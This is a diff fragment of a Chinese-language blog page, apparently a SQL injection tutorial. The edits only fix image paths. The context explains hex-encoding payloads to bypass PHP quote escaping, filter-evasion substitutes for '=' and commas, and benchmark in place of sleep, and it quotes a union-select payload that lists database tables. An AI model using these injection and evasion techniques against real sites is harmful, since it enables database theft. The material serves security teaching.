 <p>MySQL数据库可以识别十六进制，会对十六进制的数据进行自动转换</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png" alt="image-20210726153906638" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png" alt="image-20210726153906638" loading="lazy"></p>
 <p>如果PHP配置中开启了GPC，GPC会自动会单引号进行转义，这样注入就无法正常使用。</p>
 <p>但是如果将注入的数据转换成十六进制，就不需要单引号，可以正常注入</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#原来传入的注入语句
@@ -571,11 +571,11 @@ id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from informatio
 <li>等价等号</li>
 </ul>
 <p>用<code>like</code>或<code>in</code>代替<code>=</code></p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png" alt="image-20210726154407760" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png" alt="image-20210726154407760" loading="lazy"></p>
 <ul>
 <li>等价逗号</li>
 </ul>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png" alt="image-20210726154551164" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png" alt="image-20210726154551164" loading="lazy"></p>
 <ul>
 <li><p>等价函数</p>
 <p>sleep函数与benchmark函数等价</p>
